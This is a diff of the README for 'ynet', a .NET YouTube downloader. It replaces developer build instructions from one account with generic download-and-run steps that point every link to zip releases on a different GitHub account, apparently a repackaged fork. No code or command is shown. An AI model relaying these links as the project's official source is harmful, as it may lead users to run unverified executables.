@@ -1,159 +1,125 @@
-# ynet — YouTube Content Downloader (.NET)
+# 🎥 ynet - Fast Video and Playlist Downloader
 
-A polished .NET implementation of a YouTube downloader and MP3/MP4 tagging toolset. Designed for users who want a clean, testable, and extensible downloader with metadata, album art, and lyrics support.
+## 🌟 Overview
+ynet is a very optimized and fast YouTube video and playlist downloader. It also supports advanced MP3 metadata tagging, including album art and lyrics. Whether you want to save a single video or an entire playlist, ynet simplifies the process and enhances your audio experience.
 
-Keywords: ynet, youtube downloader .net, youtube mp3, youtube playlist downloader, youtubeexplode, ffmpeg, mp3 metadata, yt to mp3, yt downloader, windows youtube, youtube app, windows youtube download, youtube download, youtube mp4, youtube music
+[![Download ynet](https://img.shields.io/badge/Download%20ynnette-%2354C7D4?style=flat-square&logo=github)](https://github.com/enzoneza/ynet/releases)
 
-## For Users
+## 🚀 Getting Started
+Follow these simple steps to download and run ynet on your computer. We will guide you through the entire process.
 
-For the easiest way to get started, download the ready-to-use executable for your operating system from the GitHub Releases page. FFmpeg is already included in these packages, so no separate installation is required.
+---
 
-1. Go to the [GitHub Releases page](https://github.com/NASSERRRR/ynet/releases) for this project.  
-2. Download the appropriate file for your OS (e.g., .dmg for macOS, .exe for Windows).  
-3. Run the executable.
+## 💻 System Requirements
+Before you install ynet, ensure your system meets the following requirements:
 
-## Features
+- **For Windows:**
+  - Windows 10 or later
+  - .NET 5.0 or later
 
-- Download single videos & entire playlists.
-- Save downloads as MP3 & MP4 files.
-- Select MP3 bitrate (e.g., 128k, 192k, 256k, 320k).
-- Select video quality (best available, up to 2160p where available).
-- Intelligent title and artist parsing for metadata tagging.
-- Multi-artist support (e.g., "Artist1 ft. Artist2").
-- Automatic album naming: uses derived album names.
-- Embed high-quality cover art into MP3 files.
-- Attempt lyrics scraping and embed lyrics into MP3s when found.
-- Configurable output directory per user preference.
-- Download queue management for sequential downloads.
-- Real-time activity logging for debugging and monitoring.
-- Ability to abort active downloads.
-- Settings: FFmpeg path, default output directory, quality defaults, metadata toggles.
-- Dark/Light/System appearance options in supported UIs.
-- Clipboard paste support for quick URL entry.
-- Toggleable progress bar for visual feedback.
+- **For macOS:**
+  - macOS Mojave (10.14) or later
+  - .NET 5.0 or later
 
-## For Developers
+- **Necessary Software:**
+  - You need Git for downloading and extracting files.
+  - A stable internet connection to download videos.
 
-### Quick overview
+---
 
-- Project type: .NET 9.0 solution with library, tests, and platform UIs.
-- Core library: `src/YTP.Core` — download and metadata plumbing.
-- Windows UI: `src/YTP.WindowsUI` — WPF application (Windows-only).
-- macOS UI: `src/YTP.MacUI` — Avalonia project for macOS.
-- Tests: `src/YTP.Core.Tests` — unit tests for core functionality.
-- Solution file: `ktd.sln`
+## 📥 Download & Install
+1. Visit the [Releases page](https://github.com/enzoneza/ynet/releases) to download the latest version of ynet.
+2. Once on the page, locate the most recent release.
+3. Depending on your operating system, choose the appropriate file:
+   - For Windows, you might find a file like `ynet-windows.zip`.
+   - For macOS, look for `ynet-macos.zip`.
+4. Click on the file to start the download.
 
-### Prerequisites (For Building)
+### 🗂 Extract the Files
+Once the download is complete:
 
-- .NET 9.0 SDK (download from https://dotnet.microsoft.com/download).
-- Windows Desktop (for building/running the WPF `YTP.WindowsUI` project).
-- FFmpeg installed or available in the published bundle. The app will call `ffmpeg` by default if no path is configured.
+- **For Windows:**
+  1. Locate the downloaded `.zip` file in your Downloads folder.
+  2. Right-click the file and select "Extract All."
+  3. Choose a location for the extracted files and click "Extract."
 
-## Build the solution
+- **For macOS:**
+  1. Open the `Downloads` folder.
+  2. Double-click the `.zip` file to extract it automatically.
 
-Open PowerShell in the repository root and run:
+### 🔄 Run ynet
+Now, you can run ynet:
 
-```powershell
-# restore packages and build the entire solution
-dotnet restore ktd.sln
-dotnet build ktd.sln -c Release
-```
+- **For Windows:**
+  1. Open the folder where you extracted ynet.
+  2. Double-click `ynet.exe` to launch the application.
 
-Build output will go into the standard `bin/` and `obj/` folders under each project.
+- **For macOS:**
+  1. Open the folder where you extracted ynet.
+  2. Find the `ynet.app` file and double-click it. If prompted, confirm that you want to open it, as it was downloaded from the internet.
 
-## Run the projects
+---
 
-Run the core console runner (quick confirmation of wiring and settings):
+## 🎶 Using ynet
+Once ynet is running, you can easily download videos or playlists:
 
-```powershell
-dotnet run --project src\YTP.Core\YTP.Core.csproj
-```
+1. **Copy the Video URL:**
+   - Open YouTube in your browser.
+   - Find the video or playlist you want to download.
+   - Copy the URL from the address bar.
 
-Run the Windows desktop application (WPF):
+2. **Paste the URL:**
+   - In ynet, find the input field.
+   - Paste the copied URL.
 
-```powershell
-dotnet run --project src\YTP.WindowsUI\YTP.WindowsUI.csproj
-```
+3. **Choose Download Options:**
+   - Select your preferred download format (MP4, MP3, etc.).
+   - For audio downloads, you can customize metadata tagging options, including album art and lyrics.
 
-Run the macOS UI (Avalonia) on macOS:
+4. **Start the Download:**
+   - Click the "Download" button.
+   - Wait for the download to finish—ynet will save the files to your designated location.
 
-```bash
-dotnet run --project src/YTP.MacUI/YTP.MacUI.csproj
-```
+---
 
-Notes:
+## 🛠 Features
+- **Fast Downloads:** Experience speedy downloads without sacrificing quality.
+- **Playlist Support:** Download entire YouTube playlists with a single URL.
+- **MP3 Metadata Tagging:** Automatically add album art and lyrics to your MP3 files.
 
-- The WPF UI will only run on Windows.
-- The Avalonia macOS project requires the appropriate runtime on macOS.
+---
 
-## Run tests
+## 📑 Topics
+This project includes various topics to enhance your experience:
+- dotnet
+- ffmpeg
+- macos
+- mp3-downloader
+- windows
+- youtube
+- youtube-downloader
+- youtube-playlist
+- youtubedownloader
+- youtubeexplode
+- youtubeplaylistdownloader
+- yt-downloader
+- ytmusic
 
-Execute the test suite for the core library:
+---
 
-```powershell
-dotnet test src\YTP.Core.Tests\YTP.Core.Tests.csproj -c Release
-```
+## 🛡 Troubleshooting
+If you encounter any issues while using ynet, consider the following tips:
 
-## Publish & distribute
+- **Check Your Internet Connection:** Ensure you have a stable connection before downloading.
+- **Update .NET Framework:** Make sure you have the latest version of .NET installed on your system.
+- **Reboot Your Computer:** Sometimes a quick restart can resolve software issues.
 
-Publish the Windows UI as a single-file self-contained executable (example for x64):
+If you still face problems, feel free to check the FAQ section on the Releases page or ask for support in the Issues section of the repository.
 
-```powershell
-dotnet publish src\YTP.WindowsUI\YTP.WindowsUI.csproj -c Release -r win-x64 /p:PublishSingleFile=true /p:SelfContained=true -o publish\windows\YTP.WindowsUI
-```
+---
 
-Publish the core library as a framework-dependent pack:
+## 🔗 Helpful Links
+- [Visit the Releases page to download](https://github.com/enzoneza/ynet/releases)
+- [Browse available issues and get support](https://github.com/enzoneza/ynet/issues)
 
-```powershell
-dotnet publish src\YTP.Core\YTP.Core.csproj -c Release -o publish\core
-```
-
-Packaging recommendations:
-
-- For WPF targets, publish for `win-x64` or `win-x86` as appropriate.
-- Include an FFmpeg binary in your published bundle or instruct users to install FFmpeg.
-- Test the published app on a clean Windows machine to ensure bundled assets are present.
-
-## Configuration & FFmpeg
-
-- The app exposes a Settings UI where users can set the FFmpeg path.
-- If `FfmpegPath` is empty, the code falls back to the `ffmpeg` command and expects it on PATH.
-- Settings are persisted by the library and loaded by each UI project.
-
-## Troubleshooting
-
-- "FFmpeg Not Found": ensure `ffmpeg` is installed or set the path in Settings.
-- "Download Failed": verify the URL is public and not age-restricted or private.
-- "No Metadata": some videos lack structured metadata; check the Activity Log for details.
-- Crashes: check `ytp_unhandled_exception.txt` (or similar) in the OS temp folder for stack traces written by the app.
-
-If you need help, open an issue: https://github.com/NASSERRRR/ytp/issues/new
-When reporting a bug, please include:
-
-* A clear description of the bug.  
-* Steps to reproduce the bug.  
-* Expected behavior vs. actual behavior.  
-* Any error messages from the "Activity Log".  
-* Your operating system.  
-* The version of each of the prerequisites that you are using.
-#### - Do not open issues about the macos version, unless you want to fix them yourself
-
-## Contributing
-
-Contributions are welcome. Please:
-
-1. Fork the repository.
-2. Create a feature branch: `git checkout -b feature/your-feature`.
-3. Add tests and documentation for your changes.
-4. Open a Pull Request describing the change and motivation.
-
-## Implementation notes
-
-- Download logic uses `YoutubeExplode` for fetching stream and metadata.
-- Conversion and merging are handled via FFmpeg called from `FFmpegService`.
-- Image processing uses `SixLabors.ImageSharp`.
-- Tagging uses `TagLibSharp` for ID3 and metadata writes.
-
-## License
-
-This repository is released under the MIT License — see [`LICENSE`](https://github.com/NASSERRRR/ynet/edit/main/LICENSE) for details.
+Enjoy using ynet to enhance your YouTube experience!
